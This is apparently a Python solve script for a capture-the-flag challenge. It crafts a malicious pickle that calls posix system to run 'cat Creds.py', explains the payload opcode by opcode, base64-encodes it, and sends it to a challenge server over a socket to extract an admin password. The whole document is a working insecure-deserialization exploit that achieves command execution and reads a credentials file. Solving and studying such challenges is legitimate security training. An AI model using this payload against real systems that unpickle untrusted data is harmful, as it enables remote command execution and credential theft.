from base64 import b64encode
import socket

SERVER = 'challs.nusgreyhats.org'   # Update accordingly
PORT = 33401

evil_pickle = b"cposix\nsystem\n(S'cat Creds.py'\ntR."
'''
    0: c    GLOBAL     'posix system'
                                            # __import__('os').system
   14: (    MARK
   15: S        STRING     'cat Creds.py'
   31: t        TUPLE      (MARK at 14)
                                            # ('cat Creds.py',)
   32: R    REDUCE
                                            # __import__('os').system('cat Creds.py')
   33: .    STOP
'''

evil_token = b64encode(evil_pickle)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))  

sock.recv(1024)
try:
    sock.recv(1024)
    # for some reason, sometime the first recv doesnt 
    # collect everything from the final's deployment
except:
    pass
sock.send("e\n".encode())
sock.recv(1024)

sock.send(evil_token+b'\n')
print(f'Admin password (aka flag) is {sock.recv(79).decode()[29:]}')
sock.close()